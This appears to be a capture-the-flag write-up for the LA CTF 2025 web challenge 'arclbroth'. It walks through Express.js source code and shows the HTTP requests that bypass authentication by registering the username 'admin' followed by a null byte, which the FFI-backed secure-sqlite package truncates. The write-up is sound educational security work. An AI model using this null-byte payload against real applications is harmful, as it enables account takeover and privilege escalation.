# arclbroth

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @siunam, @ensy.zip, @ozetta, @YMD
- Solved by: @siunam
- 39 solves / 369 points
- Author: @r2uwu2
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

I heard [Arc'blroth](https://bulr.boo/) was writing challenges for LA CTF. Wait, is it arc'blroth or arcl broth?

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211154146.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211154311.png)

Let's try to register a new account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211154423.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211154453.png)

After registering a new account, we'll be redirected to `/game/`, which is a simple web game.

If we click the "Brew Broth" button, it'll combine 2 arcs and return a new one:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211154559.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211154647.png)

When we clicked that button, it'll send a POST request to `/brew`, and the server respond us with a JSON object.

If we click the "Replenish Arcs" button, it'll reset our number of arcs to 10:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211154809.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211154822.png)

When we clicked that button, it'll send a POST request to `/replenish`, and the server respond us with a JSON object.

Nothing much to do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/web/arclbroth/arclbroth.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2025/web/arclbroth)-[2025.02.11|15:49:24(HKT)]
└> file arclbroth.zip 
arclbroth.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2025/web/arclbroth)-[2025.02.11|15:49:25(HKT)]
└> unzip arclbroth.zip 
Archive:  arclbroth.zip
  inflating: app.js                  
  inflating: Dockerfile              
  inflating: package.json            
  inflating: package-lock.json       
   creating: site/
  inflating: site/index.html         
  inflating: site/style.css          
  inflating: site/main.js            
   creating: site/img/
  inflating: site/img/bulrboo.png    
   creating: site/game/
  inflating: site/game/index.html    
  inflating: site/game/style.css     
  inflating: site/game/game.js       
```

After reading the source code a little bit, we know that this web application is written in JavaScript with [Express.JS](https://expressjs.com/) framework, and the main logic of this application is in `app.js`.

First off, what's the objective in this challenge? Where's the flag?

In POST route `/brew`, **if our numbers of arc is greater than 50**, we can get the flag:

```javascript
const { init: initDb, sql} = require('secure-sqlite');
[...]
const flag = process.env.FLAG ?? 'lactf{test_flag_owo}';
[...]
app.post('/brew', (req, res) => {
  [...]
  const { arcs, username } = res.locals.user;

  if (arcs < 2) {
    res.json({ broth: 'no-arcs', arcs });
  } else if (arcs < 50) {
    sql`UPDATE users SET arcs=${arcs - 2} WHERE username=${username}`;
    res.json({ broth: 'standard', arcs: arcs - 2 });
  } else {
    sql`UPDATE users SET arcs=${arcs - 50} WHERE username=${username}`;
    res.json({ broth: flag, arcs: arcs - 50 });
  }
});
```

With that said, we need to somehow obtain more than 50 arcs in order to get the flag.

In POST route `/replenish`, we can see that **if our `username` is `admin`**, it'll **reset our numbers of arc to `100`**:

```javascript
app.post('/replenish', (req, res) => {
  [...]
  const { username } = res.locals.user;
  const arcs = username === 'admin' ? 100 : 10
  sql`UPDATE users SET arcs=${arcs}`;
  res.json({ success: true, arcs });
});
```

So... Does that mean we need to somehow **authenticate as `admin`** or **set our username to `admin`**?

Let's first see if we can set our username to `admin`. To do so, we'll need to check out the registration logic.

In POST route `/register`, it checks our `username` and `password` parameter is string data type:

```javascript
app.post('/register', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  if (!username || typeof username !== 'string') {
    res.status(400).json({ err: 'provide a username owo' });
    return;
  }

  if (!password || typeof password !== 'string') {
    res.status(400).json({ err: 'provide a password uwu' });
    return;
  }
  [...]
});
```

After that, it checks for existing username by executing a SQL query. If the query returned more than 0 rows, it'll return a JSON object that contains an error message:

```javascript
app.post('/register', (req, res) => {
  [...]
  const existing = sql`SELECT * FROM users WHERE username=${username}`;
  if (existing.length > 0) {
    res.status(400).json({ err: 'user already exists' });
    return;
  }
  [...]
});
```

Huh, it looks like the application didn't trim the `username` parameter. So, we can't just register a user with username like `admin<space_character>`.

How about the POST route `/login`? Unfortunately, the logic is same as the registration:

```javascript
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  if (!username || typeof username !== 'string') {
    res.status(400).json({ err: 'provide a username owo' });
    return;
  }

  if (!password || typeof password !== 'string') {
    res.status(400).json({ err: 'provide a password uwu' });
    return;
  }

  const existing = sql`SELECT * FROM users WHERE username=${username}`;
  if (existing.length == 0 || existing[0].password !== password) {
    res.status(400).json({ err: 'invalid login' });
    return;
  }
  [...]
});
```

So nope, we can't somehow set/register a new user with username `admin`.

Now, can we login as `admin`?

Unluckily, the `admin`'s password is random 32 hex characters, so there's no chance that we can brute force it:

```javascript
const adminpw = process.env.ADMINPW ?? crypto.randomBytes(16).toString('hex');
[...]
sql`INSERT INTO users VALUES ('admin', ${adminpw}, 100)`;
```

How about SQL injection? All of those SQL queries are directly concatenated with our user inputs. Wait, what are those `sql` keyword?

In this application, it uses a JavaScript package called [secure-sqlite](https://www.npmjs.com/package/secure-sqlite).

> A small package using a foreign function interface to access SQLite3 functions in Node, while preventing SQLIs and supporting Unicode characters. - [https://www.npmjs.com/package/secure-sqlite](https://www.npmjs.com/package/secure-sqlite)

In `package.json`, we can see that the application uses version `1.1.0` instead of the latest version (`1.1.1`):

```json
{
  [...]
  "dependencies": {
    [...]
    "secure-sqlite": "^1.1.0"
  }
}
```

Hmm... Maybe this is a 0-day or 1-day challenge?!

If we read the source code ([`secure-sqlite/lib.js`](https://www.npmjs.com/package/secure-sqlite?activeTab=code)), we can see that this package indeed perform prepared statement properly. I also `diff`'d the latest version and version `1.1.0`, but found nothing interesting.

However, there's one thing kinda weird to me, its dependencies:

```javascript
const ffi = require('ffi-napi');
const ref = require('ref-napi');
```

If we Google package [ffi-napi](https://www.npmjs.com/package/ffi-napi), we can see that it's a Node.js addon for loading and calling dynamic libraries using pure JavaScript.

> It also simplifies the augmentation of node.js with C code as it takes care of handling the translation of types across JavaScript and C, which can add reams of boilerplate code to your otherwise simple C. See the `example/factorial` for an example of this use case. - [https://www.npmjs.com/package/ffi-napi](https://www.npmjs.com/package/ffi-napi)

In `secure-sqlite/lib.js`, we can see that it loads `libsqlite3` C library:

```javascript
const _lib = ffi.Library('libsqlite3', {
  [...]
}
```

Wait, why using a foreign function interface? I mean, [Node.js has an API for SQLite](https://nodejs.org/api/sqlite.html), why not just create wrapper functions in this use case?

Anyway, in addon ffi-napi, it mentioned a lot about C language. Since **C language's strings are null-terminated (`\0`)**, maybe this package will **terminate everything after a null byte in a string**?

## Exploitation

Armed with above information, we can try to send the following POST request to route `/register`:

```http
POST /register HTTP/2
Host: arclbroth-xdt9d.instancer.lac.tf
Content-Type: application/json
Content-Length: 48

{"username":"admin\u0000","password":"anything"}
```

Response:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Date: Tue, 11 Feb 2025 08:33:21 GMT
Etag: W/"10-oV4hJxRVSENxc/wX8+mA4/Pe4tA"
Set-Cookie: session=139520655927309; Path=/
X-Powered-By: Express
Content-Length: 16

{"success":true}
```

Oh nice! It worked!

To get the flag, we need to first reset our numbers of arc to 100 via sending this POST request:

```http
POST /replenish HTTP/2
Host: arclbroth-xdt9d.instancer.lac.tf
Cookie: session=139520655927309
Content-Type: application/json
Content-Length: 0


```

Then, send a POST request to `/brew`:

```http
POST /brew HTTP/2
Host: arclbroth-xdt9d.instancer.lac.tf
Cookie: session=139520655927309
Content-Type: application/json
Content-Length: 0


```

Response:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Date: Tue, 11 Feb 2025 08:34:25 GMT
Etag: W/"4c-x32qd/XAH6LqQjlHN9VseXw0Px0"
X-Powered-By: Express
Content-Length: 76

{"broth":"lactf{bulri3v3_it_0r_n0t_s3cur3_sqlit3_w4s_n0t_s3cur3}","arcs":50}
```

- **Flag: `lactf{bulri3v3_it_0r_n0t_s3cur3_sqlit3_w4s_n0t_s3cur3}`**

## Conclusion

What we've learned:

1. Authentication bypass via null-terminated string in Node.JS Foreign Function Interface (FFI)